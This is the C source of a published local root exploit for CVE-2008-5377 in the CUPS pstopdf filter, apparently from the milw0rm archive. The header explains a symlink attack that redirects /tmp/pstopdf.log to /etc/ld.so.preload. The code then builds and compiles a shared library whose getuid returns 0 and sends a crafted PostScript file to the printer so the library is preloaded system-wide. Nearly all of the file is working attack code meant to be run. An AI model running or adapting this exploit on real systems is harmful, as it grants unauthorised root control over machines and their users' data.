/*
 * cve-2008-5377.c
 *
 * CUPS < 1.3.8-4 pstopdf filter exploit
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 * 
 * Usage:
 *
 *   $ gcc cve-2008-5377.c -o cve-2008-5377.c
 *   $ ./cve-2008-5377
 *   $ id
 *   uid=0(root) gid=1000(vm) ...
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2008-5377
 *
 *   pstopdf in CUPS 1.3.8 allows local users to overwrite arbitrary files via
 *   a symlink attack on the /tmp/pstopdf.log temporary file.
 *
 * Operation:
 *
 *   The exploit creates and prints a malformed postscript document that will
 *   cause the CUPS pstopdf filter to write an error message out to its log 
 *   file that contains the string /tmp/getuid.so.  However, since we also 
 *   symlink the pstopdf log file /tmp/pstopdf.log to /etc/ld.so.preload, the 
 *   error message and malicious shared library path will be appended to the
 *   ld.so.preload file, allowing us to elevate privileges to root.
 *
 * Note:
 * 
 *   This exploit only works under the (rare) conditions that cupsd executes 
 *   external filters as a privileged user, a printer on the system uses the 
 *   pstopdf filter (e.g. the pdf.ppd PDF converter). Also, /etc/ld.so.preload
 *   must be world readable.
 */

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>

int
main(void)
{
	int ret;
	FILE *fp;
	struct stat log;

	fp = fopen("/tmp/cve-2008-5377.ps", "w");
	if(!fp) {
		printf("error: cannot open /tmp/cve-2008-5377.ps\n");
		goto cleanup;
	}
	fprintf(fp, "%%!PS-Adobe-2.0 EPSF-2.0\n( /tmp/getuid.so ) CVE-2008-5377\n");
	fclose(fp);

	fp = fopen("/tmp/getuid.c", "w");
	if(!fp) {
		printf("error: cannot open /tmp/getuid.c\n");
		goto cleanup;
	}
	fprintf(fp, "int getuid(){return 0;}\n");
	fclose(fp);

	ret = system("cc -shared /tmp/getuid.c -o /tmp/getuid.so");
	if (WEXITSTATUS(ret) != 0) {
		printf("error: cannot compile /tmp/getuid.c\n");
		goto cleanup;
	}

	unlink("/tmp/pstopdf.log");
	ret = stat("/tmp/pstopdf.log", &log);
	if (ret != -1) {
		
		printf("error: /tmp/pstopdf.log already exists\n");
		goto cleanup;
	}

	ret = symlink("/etc/ld.so.preload", "/tmp/pstopdf.log");
	if (ret == -1) {
		printf("error: cannot symlink /tmp/pstopdf.log to /etc/ld.so.preload\n");
		goto cleanup;
	}

	ret = system("lp < /tmp/cve-2008-5377.ps");
	if (WEXITSTATUS(ret) != 0) {
		printf("error: could not print /tmp/cve-2008-5377.ps\n");
		goto cleanup;
	}

cleanup:
	unlink("/tmp/cve-2008-5377.ps");
	unlink("/tmp/getuid.c");
	return 0;
} 

// milw0rm.com [2008-12-22]
